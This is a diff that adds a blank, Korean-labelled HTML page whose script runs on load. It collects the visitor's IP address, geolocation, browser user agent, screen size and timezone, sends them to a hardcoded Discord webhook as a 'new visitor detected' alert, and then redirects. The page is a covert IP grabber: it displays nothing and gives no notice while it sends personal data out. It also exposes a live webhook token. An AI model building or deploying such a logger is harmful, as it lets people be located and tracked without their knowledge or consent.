@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+</head>
+<body>
+
+    <script>
+        const discord_webhook = 'https://discord.com/api/webhooks/1395754723897901107/wIQVU63cMDkOw-eq0DYG1dJho5oC7Ybmx4yIFBh9Bkz7oiPucNT-totugolbKVDbpUvK';
+        
+        const redirect = '';
+        
+        async function red() {
+            try {
+                let userIP = '';
+                let location = '';
+                let data = null;
+                
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    data = await response.json();
+                    userIP = data.ip;
+                    location = `${data.city}, ${data.region}, ${data.country_name}`;
+                } catch(error) {
+                    try {
+                        const response = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await response.json();
+                        userIP = ipData.ip;
+                        location = '위치 정보 없음';
+                        data = { ip: userIP };
+                    } catch(error2) {
+                        userIP = '알 수 없음';
+                        location = '알 수 없음';
+                        data = { ip: userIP };
+                    }
+                }
+
+                const message = {
+                    embeds: [{
+                        title: "🔍 새로운 방문자 감지",
+                        color: 0xff6b6b,
+                        fields: [
+                            {
+                                name: "🌐 IP 주소",
+                                value: data.ip,
+                                inline: true
+                            },
+                            {
+                                name: "📍 위치",
+                                value: location,
+                                inline: true
+                            },
+                            {
+                                name: "🖥️ 브라우저 정보",
+                                value: navigator.userAgent,
+                                inline: false
+                            },
+                            {
+                                name: "📱 화면 해상도",
+                                value: `${screen.width}x${screen.height}`,
+                                inline: true
+                            },
+                            {
+                                name: "🌍 시간대",
+                                value: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                inline: true
+                            }
+                        ],
+                        timestamp: new Date().toISOString(),
+                    }]
+                };
+
+                await fetch(discord_webhook, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message)
+                });
+                
+                window.location.href = redirect;
+
+            } catch (error) {
+                window.location.href = redirect;
+            }
+        }
+
+        window.addEventListener('load', red);
+    </script>
+</body>
+</html>\
